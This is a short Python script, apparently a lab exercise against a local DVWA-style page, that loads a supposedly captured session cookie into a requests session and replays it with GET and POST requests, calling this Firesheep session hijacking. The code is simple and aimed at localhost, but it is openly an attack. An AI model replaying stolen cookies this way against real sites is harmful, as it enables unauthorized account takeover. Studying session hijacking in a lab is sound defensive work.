"""
This class provides methods to implement session sidejacking using the Firefox extension Firesheep.
Session Sidejacking, also known as session hijacking, exploits an active web session to gain unauthorized access.
Firesheep is a Firefox extension used to capture cookies over insecure HTTP connections.
Description: The script targets a specific URL, `http://127.0.0.1/vulnerabilities/xss_d/`, 
and attempts to hijack a session using Python's requests.Session.
"""

import requests

class FiresheepSessionHijacking:
    def __init__(self, cookie):
        self.session = requests.Session()
        self.cookie = cookie
        self.set_cookie()

    def set_cookie(self):
        cookie_dict = {}
        for pair in self.cookie.split('; '):
            key, value = pair.split('=', 1)
            cookie_dict[key] = value
        self.session.cookies.update(cookie_dict)

    def get_page(self, url):
        try:
            response = self.session.get(url)
            print(response.text)
            return response.text
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
        
    def post_page(self, url, data):
        try:
            response = self.session.post(url, data=data)
            print(response.text)
            return response.text
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

def main():
    cookie = "SESSIONID=ABCDEFG1234567890; OTHER_COOKIE=value"  # Placeholder for a captured cookie by Firesheep
    hijacking = FiresheepSessionHijacking(cookie)
    
    target_url = "http://127.0.0.1/vulnerabilities/xss_d/"
    
    # Make a GET request to obtain the page
    hijacking.get_page(target_url)
    
    # POST request example (modify as needed)
    post_data = {"key": "value"}
    hijacking.post_page(target_url, post_data)

if __name__ == "__main__":
    main()

